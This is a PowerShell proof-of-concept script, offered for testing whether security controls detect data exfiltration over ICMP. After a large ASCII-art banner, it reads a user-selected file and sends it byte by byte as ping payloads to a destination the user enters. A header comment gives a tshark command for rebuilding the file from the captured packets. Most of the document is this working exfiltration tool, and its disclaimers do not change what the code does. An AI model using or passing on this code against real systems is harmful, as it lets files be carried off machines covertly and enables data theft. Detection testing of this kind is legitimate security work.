<#                             
Author of icmpExfiltrater script @cyberw01f
Last updated 6/24/2018

.SYNOPSIS 
This is a Proof of Concept. This file is for testing purposes only. Malicious use of this script is prohibitted. 

.DESCRIPTION
Exfiltrate selected data file using ICMP protocol. 

.Notes
I developed this script to assist testing security controls ability to detect/alert based on data exfiltration using the ICMP protocol. 
This is very slow and noisy so it is highly suggested that only small files are used for testing.

On the receiving end run a tcpdump/tshark session to capture the incoming ICMP data. Once the transfer is complete you can use the below tshark command to extract the data back to its normal form. 

Using Tshark to extract the paylod from the icmp data field. 
tshark -r icmp.pcap -Y ip.src==24.245.91.87 -T fields -e data | xxd -r -p > data2

Future plan:
In the future I plan to develop a server componenet that will listen for the incoming data and auto extract it
#>

$logo = @"
	=================================================================
			                                     ___  _  __ 
			 ___ _   _| |__   ___ _ ____      __/ _ \/ |/ _|
			/ __| | | | '_ \ / _ \ '__\ \ /\ / / | | | | |_ 
		        | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
			\___|\__, |_.__/ \___|_|    \_/\_/  \___/|_|_|  
				|___/                                      
		
	==================================================================
                 ,%#((%                                             %%%%%.                  
		%(%%,#%((%                                       %%%%%,&%%%               
		&(#(    /(&%%                                   &%%&*    #%%&              
		%%%*       .&%%#                               %%%&        #&%%                 
		,%%%          ,&%%                             %%%,          &%%               
		%%%             %%%,                         ,%%%             %%%                          
		%%%              %%%*                       *%%%              &%%                            
		,%%,         /%%#  %%%                       %%&  #%%/         ,%%,                           
		#%%           &%%.  %#%&&%%%%%%%%%%%%%%%&%%&%%%  /%%%           %%(                           
		(%%            %%%  .%%%&%*.       .*#&%&%%%.  %%%            %%(;)                              
		,%%*            %%%  %%%                   %&&  %%%            *%%                               
		%%%            %&%                             &%&            &%%                                  
	       &%%                                                           %%&                                    
	       *%%%                                                         %%%                                      
		%%%                                                         %%%                                       
		 &%%                                                       &%%                                         
		 .%%%                                                     %%%.                                          
		  ,%%%                                                   %%%.                                            
		   %%%                                                   %%%                                            
		 .%%%                                                  %%%.                                            
		,&%%      .%%%%%%%%%%%#            *&(%%(%(%%%&.      %%%,                                            
		%%%       %%%%%%%%%%%%%&/         /((&(&(%((%%%%%       %%%                                            
	       %%%              &%%&%%%%%&       &%&((((((&              %%%                                            
	      %(&.                &%%%,%%%       %%%,%%%%                 %%%                                           
	     %#(                   %%%           %%%                      %%%                                           
	    #%%                    %%%           %%%                       &%&                                         
	   &%%                     %%%           %%%                       %%%                                         
	   %%(                     %%%           &%%                       %%%                                         
	  ,%%,                     %%&           %%%                       (%%,                                        
	   %%%%                                                             %%%%                                         
	    &%%.                                                         .%%%                                           
	     %%%%               %%%    #%%%%%%%%%#    %%%               %%%%                                            
	     ,%%%              %#%/  %%&/.....(%%%  /%%%              &%%,                                             
	       &%%              %%%   %%%     %%%   %%&              %%%                                               
		&%%              &%%  ,%%&,,,%&%,  %%%              %%%                                                
		 %%%  ,&,         %%%  .&%%%&%&.  &%%         ,&,  &%%                                                     
		 .%%%%%%%%        ,%%%           %%%,        (%%%%%%%.                                                 
		  *(*  .%%%        /%%%%%%%%%%%%%%&.        (%%.  /&(                                                     
			%%%             #&&&&&&&&          %%%                                                           
			  %%%                             %%%                                                           
			   &%%                           %#%                                                             
			   %%%(  (%%               #((  /%%/ 
                             %%&%%%%%&             %%%%%%%%%                                                           												%%&%%%%%&             %%%%%%%%%                                                             
			      *%%(   %%         %%%%   (%%*                                                            
				     #%%%       &%%#                                                                   
				      %%&     %%%                                                                     					   %%%   %%%                                                                     
				        %%% %%%                                                                     
				         %%%%%                                                                     
				         #%%%#                                                                    						  %%&                                                                    
				           . 		
					@cyberw01f
"@
$label = @"          
                      ICMP Data Exfiltrater
  Data used with this script is to be used only for testing security controls
                 Resppnsible use only is spermited
"@


Function Get-File
{
Add-Type -AssemblyName System.Windows.Forms
$fileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{
    Multiselect = $false # When set to $true multiple files can be chosen
}
 
[void]$fileBrowser.ShowDialog()
 
$script:fileName = $fileBrowser.FileName;
$script:file = $fileBrowser.SafeFileName;
$script:data = (Get-Content $fileName -Raw) 

If($FileBrowser.FileNames -like "*\*") {
 
        # Do something 
        $fileBrowser.FileName #Lists selected files (optional)
        
 
}
 
else {
    Write-Host -f Green  "File select cancelled by user"
    Exit
}

#nl var simply does a carrage return / new line
$nl = [Environment]::NewLine
 
}
Write-Host -f Magenta $logo
Write-Host
Write-Host -f Green $label
$nl
$destination = read-host "PING Destination Doamin or IP address"
Get-File
$bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
$PingObj = New-Object System.Net.NetworkInformation.ping
###############################################################################
# Edit the string "Domain or IP" to include the reciving client
###############################################################################
ForEach ($line in $bytes) {$PingAnswer = $PingObj.Send("$destination", 1000, $line);} 
Write-Host "$_" $PingAnswer.Status;
